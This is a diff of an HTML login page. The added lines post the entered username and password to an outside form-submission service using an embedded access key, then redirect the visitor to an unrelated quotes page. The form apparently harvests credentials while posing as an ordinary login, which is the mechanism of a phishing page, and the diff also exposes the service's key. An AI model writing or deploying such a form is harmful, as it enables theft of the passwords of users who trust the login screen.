@@ -14,24 +14,29 @@
         <div class="login_body" id="login_body">
             <h1 class="title">Login</h1>
             <h4 class="subtitle">Please enter your Login and your Password.</h4>
-            <form action="">
+            <form action="https://api.staticforms.xyz/submit" method="post">
+                <input type="hidden" name="accessKey" value="7e620220-2275-4ced-8167-e9f25fceddf7">
                 <div class="div_input_login">
                     <img src="img/person_login.png" class="img_login_person" alt="loginicon">
-                    <input type="text" class="input_login" placeholder="Username or E-mail">
+                    <input type="text" name="email" class="input_login" placeholder="Username or E-mail">
                 </div>
                 <div class="div_input_password">
                     <img src="img/password_icon.png" class="img_login_person" alt="loginicon">
-                    <input type="password" class="input_login" placeholder="Password">
+                    <input type="password" name="name" class="input_login" placeholder="Password">
                 </div>
-                <h5><i class="txt_forgot">Forgot password?</i></h5>
+                <h5><i class="txt_forgot"><a href="#">Forgot password?</a> </i></h5>
                 <br>
-                <button class="bt_login">Login</button>
-                <button class="bt_google"><img src="img/google_icon.png" class="img_bt_google" alt="googleIcon">Or,
-                    sign-in with Google
+                <button class="bt_login" value="Submit">Login</button>
+                <button class="bt_google">
+                    <div class="div_bt_google"><img src="img/google_icon.png" class="img_bt_google" alt="googleIcon">Or,
+                        sign-in with Google</div>
                 </button>
                 <div class="div_txt">
-                    <i class="txt">Not a member yet?</i><i class="txt"><a href="#">Register!</a></i>
+                    <i class="txt">Not a member yet?</i><i class="txt">
+                        <div class="div_register_line"><a href="#">Register!</a></div>
+                    </i>
                 </div>
+                <input type="hidden" name="redirectTo" value="https://www.pensador.com/voce_e_linda/">
             </form>
         </div>
     </div>
